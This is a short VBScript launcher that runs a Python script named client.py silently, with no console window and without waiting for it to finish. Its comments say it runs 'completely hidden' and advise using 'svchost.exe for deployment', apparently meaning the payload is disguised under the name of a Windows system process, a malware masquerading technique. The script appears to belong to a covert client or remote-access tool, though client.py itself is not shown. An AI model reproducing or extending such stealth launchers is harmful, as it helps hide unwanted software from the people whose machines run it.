' Silent launcher for client.py - Runs completely hidden
' Double-click this file to run client.py without any console window
' Created for testing purposes - USE svchost.exe for deployment

Set WshShell = CreateObject("WScript.Shell")

' Run pythonw.exe with client.py in hidden mode
' Parameter 0 = Completely hidden, no window
' Parameter False = Don't wait for completion
WshShell.Run "pythonw client.py", 0, False

Set WshShell = Nothing

' Exit silently
WScript.Quit
